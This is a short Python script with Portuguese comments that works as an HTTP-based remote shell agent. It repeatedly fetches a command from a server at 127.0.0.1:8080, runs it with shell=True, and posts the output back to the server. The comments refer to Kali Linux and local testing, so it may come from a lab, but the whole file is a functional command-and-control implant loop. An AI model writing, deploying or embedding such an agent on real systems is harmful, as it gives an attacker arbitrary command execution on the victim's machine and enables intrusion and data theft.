import urllib.request
import urllib.parse
import subprocess
import time
import sys

# Se testar localmente na mesma máquina, mantenha 127.0.0.1
URL_SERVIDO = "http://127.0.0.1:8080"

print("[*] Kali pronto, monitorando o servidor de comandos...")

while True:
    try:
        # 1. Busca comando no servidor
        with urllib.request.urlopen(URL_SERVIDO, timeout=3) as response:
            comando = response.read().decode('utf-8').strip()
        
        if comando:
            if comando.lower() == 'exit':
                print("[*] Comando de saída recebido.")
                sys.exit(0)
                
            # 2. Executa o comando no shell do Kali Linux
            proc = subprocess.Popen(comando, shell=True, 
                                    stdout=subprocess.PIPE, 
                                    stderr=subprocess.PIPE, 
                                    stdin=subprocess.PIPE)
            stdout, stderr = proc.communicate()
            resposta = stdout + stderr
            
            if not resposta:
                resposta = b"[+] Comando executado sem retorno de texto.\n"
                
            # 3. Envia o resultado de volta via POST
            req = urllib.request.Request(URL_SERVIDO, data=resposta, method='POST')
            req.add_header('Content-Type', 'text/plain')
            with urllib.request.urlopen(req, timeout=3) as response:
                pass # Confirma o recebimento
                
    except urllib.error.URLError:
        # Se o servidor estiver offline, espera um pouco e tenta novamente
        time.sleep(2)
        continue
    except (KeyboardInterrupt, SystemExit):
        break
    
    # Intervalo de checagem mais agressivo (0.5s) para dar uma experiência fluida no terminal
    time.sleep(0.5)
